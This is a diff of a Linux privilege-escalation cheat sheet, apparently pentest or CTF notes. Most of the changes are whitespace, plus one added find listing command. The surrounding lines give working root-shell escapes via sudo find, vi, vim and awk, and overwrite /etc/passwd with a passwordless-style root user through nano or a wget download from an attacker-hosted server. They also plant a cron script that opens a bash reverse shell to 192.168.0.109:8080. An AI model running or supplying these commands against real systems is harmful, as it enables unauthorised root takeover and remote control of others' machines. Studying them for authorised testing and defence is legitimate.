@@ -22,11 +22,11 @@ Explain 1: The root user can execute from ALL terminals, acting as ALL (any) use
 The first part is the user, the second is the terminal from where the user can use the sudocommand, the third part is which users he may act as, and the last one is which commands he may run when using.sudo
 
     user1 ALL= /sbin/poweroff
-  
+
 Explain 2: The above command, makes the user user1 can from any terminal, run the command power off using user1’s user password.
 
     user1 ALL = (root) NOPASSWD: /usr/bin/find
-  
+
 Explain 3:  The above command, make the user touhid can from any terminal, run the command find as root user without password.
 
 
@@ -40,6 +40,17 @@ Also possible to check all files with SUID bits set with
         find / -perm -u=s -type f 2>/dev/null
         or
         find / -perm -4000 -type f 2>/dev/null
+
+
+
+**Something interesting Ippsec shared***
+
+~~~bash
+find home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column t
+
+\t means tab, \n means newline
+~~~
+
 
 
 **Listing**
@@ -82,21 +93,21 @@ Using Find Command
 
     sudo find /etc/passwd -exec /bin/sh \;
     or
-
-    sudo find /bin -name nano -exec /bin/sh \;
     
+    sudo find /bin -name nano -exec /bin/sh \;
+
 Using Vi Command
 
     sudo vi
     :shell
-
+    
     :set shell=/bin/bash:shell    
     :!bash
 
 Using Vim Command
 
     sudo vim -c '!sh'
-    
+
 Using Nmap Command
 Old way.
 
@@ -139,7 +150,7 @@ You need to run more on a file that is bigger than your screen.
 Using awk Command
 
     sudo awk 'BEGIN {system("/bin/sh")}'
- 
+
 Using nano Command
 nano is text editor using this editor u can modify passwd file and add a user in passwd file as root privilege after that u need to switch user. Add this line in /etc/passwd to order to add the user as root privilege.
 
@@ -151,7 +162,7 @@ nano is text editor using this editor u can modify passwd file and add a user in
 now switch user password with password : test
 
     su user1
-    
+
 
 
 Using wget Command
@@ -169,7 +180,7 @@ host that passwd file to using any web server.
 On Victim Side.
 
     sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd
-    
+
 now switch user password  : test
 
     su user1
@@ -197,7 +208,7 @@ echo ‘bash -i >& /dev/tcp/192.168.0.109/8080 0>&1’ > getinfo.sh
 
     cat getinfo.sh
     #!/bin/bash
-
+    
     bash -i >& /dev/tcp/192.168.0.109/8080 0>&1
 
 Now we can setup another nc and run the script and wait until the cron job runs. It will run as a root user.
@@ -212,7 +223,7 @@ On Kali Linux:
 Checking for running services running as root
 
         ps aux
-        
+
 MySQL
 
 if this is running as root you can run commands if you are able to log in:
@@ -257,5 +268,5 @@ Check Version
 Search for exploits
 
         site:exploit-db.com kernel version
-
+    
         python linprivchecker.py extended
